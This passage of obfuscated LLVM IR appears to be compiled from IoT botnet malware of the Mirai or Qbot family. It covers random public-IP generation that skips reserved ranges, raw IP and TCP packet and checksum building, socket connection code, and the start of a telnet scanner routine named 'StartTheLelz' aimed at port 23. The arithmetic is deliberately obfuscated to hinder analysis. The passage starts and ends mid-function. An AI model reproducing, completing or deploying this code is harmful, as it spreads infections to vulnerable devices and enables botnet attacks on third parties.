  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp sgt i32 %80, 254
  br i1 %81, label %152, label %82

; <label>:82:                                     ; preds = %78, %74
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 198
  br i1 %85, label %86, label %94

; <label>:86:                                     ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp sge i32 %88, 18
  br i1 %89, label %90, label %94

; <label>:90:                                     ; preds = %86
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp slt i32 %92, 20
  br i1 %93, label %152, label %94

; <label>:94:                                     ; preds = %90, %86, %82
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 224
  br i1 %97, label %152, label %98

; <label>:98:                                     ; preds = %94
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 6
  br i1 %101, label %150, label %102

; <label>:102:                                    ; preds = %98
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 7
  br i1 %105, label %150, label %106

; <label>:106:                                    ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 11
  br i1 %109, label %150, label %110

; <label>:110:                                    ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 21
  br i1 %113, label %150, label %114

; <label>:114:                                    ; preds = %110
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 22
  br i1 %117, label %150, label %118

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 26
  br i1 %121, label %150, label %122

; <label>:122:                                    ; preds = %118
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 28
  br i1 %125, label %150, label %126

; <label>:126:                                    ; preds = %122
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 29
  br i1 %129, label %150, label %130

; <label>:130:                                    ; preds = %126
  %131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 30
  br i1 %133, label %150, label %134

; <label>:134:                                    ; preds = %130
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 33
  br i1 %137, label %150, label %138

; <label>:138:                                    ; preds = %134
  %139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %140 = zext i8 %139 to i32
  %141 = icmp eq i32 %140, 55
  br i1 %141, label %150, label %142

; <label>:142:                                    ; preds = %138
  %143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 214
  br i1 %145, label %150, label %146

; <label>:146:                                    ; preds = %142
  %147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 215
  br label %150

; <label>:150:                                    ; preds = %146, %142, %138, %134, %130, %126, %122, %118, %114, %110, %106, %102, %98
  %151 = phi i1 [ true, %142 ], [ true, %138 ], [ true, %134 ], [ true, %130 ], [ true, %126 ], [ true, %122 ], [ true, %118 ], [ true, %114 ], [ true, %110 ], [ true, %106 ], [ true, %102 ], [ true, %98 ], [ %149, %146 ]
  br label %152

; <label>:152:                                    ; preds = %150, %94, %90, %78, %70, %58, %46, %38, %34, %30, %26, %22, %18, %14
  %153 = phi i1 [ true, %94 ], [ true, %90 ], [ true, %78 ], [ true, %70 ], [ true, %58 ], [ true, %46 ], [ true, %38 ], [ true, %34 ], [ true, %30 ], [ true, %26 ], [ true, %22 ], [ true, %18 ], [ true, %14 ], [ %151, %150 ]
  br i1 %153, label %154, label %167

; <label>:154:                                    ; preds = %152
  %155 = call i32 @rand() #2
  %156 = srem i32 %155, 223
  %157 = trunc i32 %156 to i8
  store i8 %157, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %158 = call i32 @rand() #2
  %159 = srem i32 %158, 255
  %160 = trunc i32 %159 to i8
  store i8 %160, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %161 = call i32 @rand() #2
  %162 = srem i32 %161, 255
  %163 = trunc i32 %162 to i8
  store i8 %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %164 = call i32 @rand() #2
  %165 = srem i32 %164, 255
  %166 = trunc i32 %165 to i8
  store i8 %166, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:167:                                    ; preds = %152
  %168 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %168, i8 0, i64 16, i32 16, i1 false)
  %169 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %171 = zext i8 %170 to i32
  %172 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %173 = zext i8 %172 to i32
  %174 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %175 = zext i8 %174 to i32
  %176 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  %177 = zext i8 %176 to i32
  %178 = call i32 (i8*, i8*, ...) @szprintf(i8* %169, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.346, i32 0, i32 0), i32 %171, i32 %173, i32 %175, i32 %177)
  %179 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %180 = call i32 @inet_addr(i8* %179) #2
  ret i32 %180
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %5, -1
  %8 = xor i32 %6, -1
  %9 = xor i32 734869295, -1
  %10 = or i32 %7, %8
  %11 = or i32 734869295, %9
  %12 = xor i32 %10, -1
  %13 = and i32 %12, %11
  %14 = and i32 %5, %6
  store i32 %13, i32* %3, align 4
  %15 = load i32, i32* %3, align 4
  %16 = call i32 @rand_cmwc()
  %17 = load i32, i32* %2, align 4
  %18 = xor i32 %17, -1
  %19 = and i32 -947562824, %18
  %20 = xor i32 -947562824, -1
  %21 = and i32 %17, %20
  %22 = xor i32 -1, -1
  %23 = and i32 %22, -947562824
  %24 = and i32 -1, %20
  %25 = or i32 %19, %21
  %26 = or i32 %23, %24
  %27 = xor i32 %25, %26
  %28 = xor i32 %17, -1
  %29 = xor i32 %27, -1
  %30 = xor i32 %16, %29
  %31 = and i32 %30, %16
  %32 = and i32 %16, %27
  %33 = xor i32 %15, -1
  %34 = and i32 819987681, %33
  %35 = xor i32 819987681, -1
  %36 = and i32 %15, %35
  %37 = xor i32 %31, -1
  %38 = and i32 %37, 819987681
  %39 = and i32 %31, %35
  %40 = or i32 %34, %36
  %41 = or i32 %38, %39
  %42 = xor i32 %40, %41
  %43 = xor i32 %15, %31
  ret i32 %42
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %24

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, -6999114279708360425
  %16 = add i64 %15, %13
  %17 = sub i64 %16, -6999114279708360425
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  %19 = load i32, i32* %4, align 4
  %20 = add i32 %19, -1458178253
  %21 = sub i32 %20, 2
  %22 = sub i32 %21, -1458178253
  %23 = sub nsw i32 %19, 2
  store i32 %22, i32* %4, align 4
  br label %6

; <label>:24:                                     ; preds = %6
  %25 = load i32, i32* %4, align 4
  %26 = icmp sgt i32 %25, 0
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %24
  %28 = load i16*, i16** %3, align 8
  %29 = bitcast i16* %28 to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = load i64, i64* %5, align 8
  %33 = sub i64 %32, -3727271679451176552
  %34 = add i64 %33, %31
  %35 = add i64 %34, -3727271679451176552
  %36 = add i64 %32, %31
  store i64 %35, i64* %5, align 8
  br label %37

; <label>:37:                                     ; preds = %27, %24
  br label %38

; <label>:38:                                     ; preds = %42, %37
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = icmp ne i64 %40, 0
  br i1 %41, label %42, label %54

; <label>:42:                                     ; preds = %38
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 65535, -1
  %45 = xor i64 %43, %44
  %46 = and i64 %45, %43
  %47 = and i64 %43, 65535
  %48 = load i64, i64* %5, align 8
  %49 = lshr i64 %48, 16
  %50 = add i64 %46, -7701424569884093396
  %51 = add i64 %50, %49
  %52 = sub i64 %51, -7701424569884093396
  %53 = add i64 %46, %49
  store i64 %52, i64* %5, align 8
  br label %38

; <label>:54:                                     ; preds = %38
  %55 = load i64, i64* %5, align 8
  %56 = xor i64 %55, -1
  %57 = and i64 -1, %56
  %58 = xor i64 -1, -1
  %59 = and i64 %55, %58
  %60 = or i64 %57, %59
  %61 = xor i64 %55, -1
  %62 = trunc i64 %60 to i16
  ret i16 %62
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 %13, -1
  %15 = xor i8 -16, -1
  %16 = xor i8 81, -1
  %17 = or i8 %14, %15
  %18 = or i8 81, %16
  %19 = xor i8 %17, -1
  %20 = and i8 %19, %18
  %21 = and i8 %13, -16
  %22 = xor i8 %20, -1
  %23 = xor i8 5, -1
  %24 = xor i8 -91, -1
  %25 = and i8 %22, -91
  %26 = and i8 %20, %24
  %27 = and i8 %23, -91
  %28 = and i8 5, %24
  %29 = or i8 %25, %26
  %30 = or i8 %27, %28
  %31 = xor i8 %29, %30
  %32 = or i8 %22, %23
  %33 = xor i8 %32, -1
  %34 = or i8 -91, %24
  %35 = and i8 %33, %34
  %36 = or i8 %31, %35
  %37 = or i8 %20, 5
  store i8 %36, i8* %12, align 4
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = bitcast %struct.iphdr* %38 to i8*
  %40 = load i8, i8* %39, align 4
  %41 = xor i8 %40, -1
  %42 = xor i8 15, -1
  %43 = xor i8 63, -1
  %44 = or i8 %41, %42
  %45 = or i8 63, %43
  %46 = xor i8 %44, -1
  %47 = and i8 %46, %45
  %48 = and i8 %40, 15
  %49 = xor i8 %47, -1
  %50 = xor i8 64, -1
  %51 = xor i8 91, -1
  %52 = and i8 %49, 91
  %53 = and i8 %47, %51
  %54 = and i8 %50, 91
  %55 = and i8 64, %51
  %56 = or i8 %52, %53
  %57 = or i8 %54, %55
  %58 = xor i8 %56, %57
  %59 = or i8 %49, %50
  %60 = xor i8 %59, -1
  %61 = or i8 91, %51
  %62 = and i8 %60, %61
  %63 = or i8 %58, %62
  %64 = or i8 %47, 64
  store i8 %63, i8* %39, align 4
  %65 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 1
  store i8 0, i8* %66, align 1
  %67 = load i32, i32* %10, align 4
  %68 = sext i32 %67 to i64
  %69 = add i64 20, -3961015186190255813
  %70 = add i64 %69, %68
  %71 = sub i64 %70, -3961015186190255813
  %72 = add i64 20, %68
  %73 = trunc i64 %71 to i16
  %74 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %75 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %74, i32 0, i32 2
  store i16 %73, i16* %75, align 2
  %76 = call i32 @rand_cmwc()
  %77 = trunc i32 %76 to i16
  %78 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %79 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %78, i32 0, i32 3
  store i16 %77, i16* %79, align 4
  %80 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %81 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %80, i32 0, i32 4
  store i16 0, i16* %81, align 2
  %82 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %83 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %82, i32 0, i32 5
  store i8 -1, i8* %83, align 4
  %84 = load i8, i8* %9, align 1
  %85 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i32 0, i32 6
  store i8 %84, i8* %86, align 1
  %87 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %88 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %87, i32 0, i32 7
  store i16 0, i16* %88, align 2
  %89 = load i32, i32* %8, align 4
  %90 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %91 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %90, i32 0, i32 8
  store i32 %89, i32* %91, align 4
  %92 = load i32, i32* %7, align 4
  %93 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %94 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %93, i32 0, i32 9
  store i32 %92, i32* %94, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #2
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #2
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [128 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %23 = load i32, i32* %4, align 4
  store i32 %23, i32* %11, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = call i32 @rand_cmwc()
  %26 = xor i32 %24, -1
  %27 = and i32 -951419736, %26
  %28 = xor i32 -951419736, -1
  %29 = and i32 %24, %28
  %30 = xor i32 %25, -1
  %31 = and i32 %30, -951419736
  %32 = and i32 %25, %28
  %33 = or i32 %27, %29
  %34 = or i32 %31, %32
  %35 = xor i32 %33, %34
  %36 = xor i32 %24, %25
  call void @srand(i32 %35) #2
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %37, align 4
  %38 = call zeroext i16 @htons(i16 zeroext 23) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %41 = getelementptr inbounds [8 x i8], [8 x i8]* %40, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 8, i32 4, i1 false)
  %42 = call noalias i8* @malloc(i64 1025) #2
  store i8* %42, i8** %17, align 8
  %43 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %43, i8 0, i64 1025, i32 1, i1 false)
  %44 = load i32, i32* %11, align 4
  %45 = zext i32 %44 to i64
  %46 = call i8* @llvm.stacksave()
  store i8* %46, i8** %19, align 8
  %47 = alloca %struct.telstate_t, i64 %45, align 16
  %48 = bitcast %struct.telstate_t* %47 to i8*
  %49 = load i32, i32* %11, align 4
  %50 = sext i32 %49 to i64
  %51 = mul i64 %50, 5
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 %51, i32 16, i1 false)
  store i32 0, i32* %5, align 4
  br label %52

; <label>:52:                                     ; preds = %70, %2
  %53 = load i32, i32* %5, align 4
  %54 = load i32, i32* %11, align 4
  %55 = icmp slt i32 %53, %54
  br i1 %55, label %56, label %76

; <label>:56:                                     ; preds = %52
  %57 = load i32, i32* %5, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %58
  %60 = bitcast %struct.telstate_t* %59 to i8*
  call void @llvm.memset.p0i8.i64(i8* %60, i8 0, i64 32, i32 16, i1 false)
  %61 = load i32, i32* %5, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %62
  %64 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %63, i32 0, i32 3
  store i8 1, i8* %64, align 1
  %65 = load i8*, i8** %17, align 8
  %66 = load i32, i32* %5, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %67
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %68, i32 0, i32 9
  store i8* %65, i8** %69, align 8
  br label %70

; <label>:70:                                     ; preds = %56
  %71 = load i32, i32* %5, align 4
  %72 = add i32 %71, -745724770
  %73 = add i32 %72, 1
  %74 = sub i32 %73, -745724770
  %75 = add nsw i32 %71, 1
  store i32 %74, i32* %5, align 4
  br label %52

; <label>:76:                                     ; preds = %52
  store i32 0, i32* %7, align 4
  br label %77

; <label>:77:                                     ; preds = %87, %76
  %78 = load i32, i32* %7, align 4
  %79 = add i32 %78, 59165034
  %80 = add i32 %79, 1
  %81 = sub i32 %80, 59165034
  %82 = add nsw i32 %78, 1
  store i32 %81, i32* %7, align 4
  %83 = sext i32 %81 to i64
  %84 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %83
  %85 = load i8*, i8** %84, align 8
  %86 = icmp ne i8* %85, null
  br i1 %86, label %87, label %88

; <label>:87:                                     ; preds = %77
  br label %77

; <label>:88:                                     ; preds = %77
  br label %89

; <label>:89:                                     ; preds = %741, %88
  br label %90

; <label>:90:                                     ; preds = %89
  store i32 0, i32* %5, align 4
  br label %91

; <label>:91:                                     ; preds = %734, %90
  %92 = load i32, i32* %5, align 4
  %93 = load i32, i32* %11, align 4
  %94 = icmp slt i32 %92, %93
  br i1 %94, label %95, label %741

; <label>:95:                                     ; preds = %91
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %97
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %98, i32 0, i32 7
  %100 = load i32, i32* %99, align 16
  %101 = icmp eq i32 %100, 0
  br i1 %101, label %102, label %108

; <label>:102:                                    ; preds = %95
  %103 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %104 = load i32, i32* %5, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %105
